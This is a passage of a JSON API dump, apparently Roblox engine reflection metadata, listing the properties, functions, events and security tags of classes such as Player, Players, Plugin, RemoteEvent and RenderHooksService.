Type":"float","type":"Property","Name":"MaximumSimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"MembershipType","type":"Property","Name":"MembershipType","tags":["readonly"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"PersonalServerRank","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"RespawnLocation","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"SimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Teleported","tags":["RobloxScriptSecurity","hidden","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"TeleportedIn","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"UserId","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"VRDevice","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"userId","tags":["deprecated"],"Class":"Player"},{"ReturnType":"void","Arguments":[],"Name":"ClearCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"float","Arguments":[{"Type":"Vector3","Name":"point","Default":null}],"Name":"DistanceFromCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"FriendStatus","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"GetFriendStatus","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetGameSessionID","tags":["RobloxSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUnder13","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"HasAppearanceLoaded","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"JumpCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Kick","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadBoolean","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"inGame","Default":"true"}],"Name":"LoadCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"assetInstance","Default":null}],"Name":"LoadCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadInstance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadNumber","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadString","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"walkDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"walkDirection","Default":null},{"Type":"float","Name":"maxWalkDelta","Default":null}],"Name":"MoveCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveCharacter","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RequestFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RevokeFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SaveBoolean","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"SaveInstance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveLeaderboardData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"SaveNumber","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SaveString","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"accountAge","Default":null}],"Name":"SetAccountAge","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"MembershipType","Name":"membershipType","Default":null}],"Name":"SetMembershipType","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetSuperSafeChat","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetUnder13","tags":["RobloxSecurity","deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"saveBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"saveInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"saveNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"saveString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"maxFriends","Default":"200"}],"Name":"GetFriendsOnline","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRankInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRoleInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[],"Name":"GetWebPersonalServerRank","tags":["LocalUserSecurity","backend"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsBestFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsFriendsWith","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"IsInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"rank","Default":null}],"Name":"SetWebPersonalServerRank","tags":["WritePlayerSecurity"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"WaitForDataReady","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"isFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"waitForDataReady","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAdded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAppearanceLoaded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterRemoving","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"recipient","Type":"Instance"}],"Name":"Chatted","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"friendStatus","Type":"FriendStatus"}],"Name":"FriendStatusChanged","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"}],"Name":"Idled","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"teleportState","Type":"TeleportState"},{"Name":"placeId","Type":"int"},{"Name":"spawnName","Type":"string"}],"Name":"OnTeleport","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"radius","Type":"float"}],"Name":"SimulationRadiusChanged","tags":["LocalUserSecurity"],"Class":"Player","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PlayerScripts","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Players","tags":[]},{"ValueType":"bool","type":"Property","Name":"BubbleChat","tags":["readonly"],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"CharacterAutoLoads","tags":[],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"ClassicChat","tags":["readonly"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"LocalPlayer","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"NumPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"localPlayer","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"numPlayers","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddLeaderboardKey","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"Chat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"bool","Name":"isTeleport","Default":"false"}],"Name":"CreateLocalPlayer","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userID","Default":null}],"Name":"GetPlayerByID","tags":["LocalUserSecurity","deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerById","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerByUserId","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"GetPlayerFromCharacter","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPlayers","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUseCoreScriptHealthBar","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"reason","Default":null},{"Type":"string","Name":"optionalMessage","Default":null}],"Name":"ReportAbuse","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAbuseReportUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBuildUserPermissionsUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetChatFilterUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ChatStyle","Name":"style","Default":"Classic"}],"Name":"SetChatStyle","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetLoadDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSaveDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSaveLeaderboardDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSysStatsUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"urlId","Default":null}],"Name":"SetSysStatsUrlId","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"TeamChat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null},{"Type":"Instance","Name":"player","Default":null}],"Name":"WhisperChat","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"getPlayerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getPlayers","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"playerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"players","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"blockerUserId","Default":null},{"Type":"int","Name":"blockeeUserId","Default":null}],"Name":"BlockUser","tags":["RobloxScriptSecurity"],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetCharacterAppearanceAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetFriendsAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetNameFromUserIdAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"userName","Default":null}],"Name":"GetUserIdFromNameAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"exblockerUserId","Default":null},{"Type":"int","Name":"exblockeeUserId","Default":null}],"Name":"UnblockUser","tags":["RobloxScriptSecurity"],"Class":"Players","type":"YieldFunction"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"player","Type":"Instance"},{"Name":"friendRequestEvent","Type":"FriendRequestEvent"}],"Name":"FriendRequestEvent","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"}],"Name":"GameAnnounce","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAdded","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAddedEarly","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"chatType","Type":"PlayerChatType"},{"Name":"player","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"targetPlayer","Type":"Instance"}],"Name":"PlayerChatted","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemoving","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemovingLate","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Plugin","tags":[]},{"ValueType":"bool","type":"Property","Name":"CollisionEnabled","tags":["readonly"],"Class":"Plugin"},{"ValueType":"float","type":"Property","Name":"GridSize","tags":["readonly"],"Class":"Plugin"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusiveMouse","Default":null}],"Name":"Activate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"CreateToolbar","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"JointCreationMode","Arguments":[],"Name":"GetJoinMode","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetStudioUserId","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Negate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"script","Default":null},{"Type":"int","Name":"lineNumber","Default":"0"}],"Name":"OpenScript","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenWikiPage","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveSelectedToRoblox","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Separate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Union","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"assetType","Default":null}],"Name":"PromptForExistingAssetId","tags":["PluginSecurity"],"Class":"Plugin","type":"YieldFunction"},{"Arguments":[],"Name":"Deactivation","tags":["PluginSecurity"],"Class":"Plugin","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PluginManager","tags":[]},{"ReturnType":"Instance","Arguments":[],"Name":"CreatePlugin","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportPlace","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportSelection","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PointsService","tags":["notCreatable"]},{"ReturnType":"int","Arguments":[],"Name":"GetAwardablePoints","tags":["deprecated"],"Class":"PointsService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"amount","Default":null}],"Name":"AwardPoints","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGamePointBalance","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPointBalance","tags":["deprecated"],"Class":"PointsService","type":"YieldFunction"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"pointsAwarded","Type":"int"},{"Name":"userBalanceInGame","Type":"int"},{"Name":"userTotalBalance","Type":"int"}],"Name":"PointsAwarded","tags":[],"Class":"PointsService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Pose","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingDirection","type":"Property","Name":"EasingDirection","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingStyle","type":"Property","Name":"EasingStyle","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"MaskWeight","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"Weight","tags":[],"Class":"Pose"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddSubPose","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetSubPoses","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemoveSubPose","tags":[],"Class":"Pose","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PostEffect","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"PostEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BloomEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Threshold","tags":[],"Class":"BloomEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BlurEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BlurEffect"},{"Superclass":"PostEffect","type":"Class","Name":"ColorCorrectionEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Contrast","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Saturation","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"Color3","type":"Property","Name":"TintColor","tags":[],"Class":"ColorCorrectionEffect"},{"Superclass":"PostEffect","type":"Class","Name":"SunRaysEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"SunRaysEffect"},{"ValueType":"float","type":"Property","Name":"Spread","tags":[],"Class":"SunRaysEffect"},{"Superclass":"Instance","type":"Class","Name":"RayValue","tags":[]},{"ValueType":"Ray","type":"Property","Name":"Value","tags":[],"Class":"RayValue"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"Changed","tags":[],"Class":"RayValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"changed","tags":["deprecated"],"Class":"RayValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadata","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataCallbacks","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataClasses","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEnums","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEvents","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataItem","tags":[]},{"ValueType":"bool","type":"Property","Name":"Browsable","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"Deprecated","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"IsBackend","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMaximum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMinimum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"string","type":"Property","Name":"summary","tags":[],"Class":"ReflectionMetadataItem"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataClass","tags":[]},{"ValueType":"int","type":"Property","Name":"ExplorerImageIndex","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"int","type":"Property","Name":"ExplorerOrder","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"bool","type":"Property","Name":"Insertable","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"string","type":"Property","Name":"PreferredParent","tags":[],"Class":"ReflectionMetadataClass"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnum","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnumItem","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataMember","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataProperties","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataYieldFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"RemoteEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireAllClients","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireClient","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireServer","tags":[],"Class":"RemoteEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RemoteFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeClient","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeServer","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"ReturnType":"Tuple","Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"RenderHooksService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"CaptureMetrics","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"qId","Default":null}],"Name":"DisableQueue","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"EnableAdorns","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"qId","Default":null}],"Name":"EnableQueue","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetDeltaAve","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetGPUDelay","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetPresentTime","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderAve","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderConfMax","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderConfMin","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderStd","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PrintScene","tags":["Local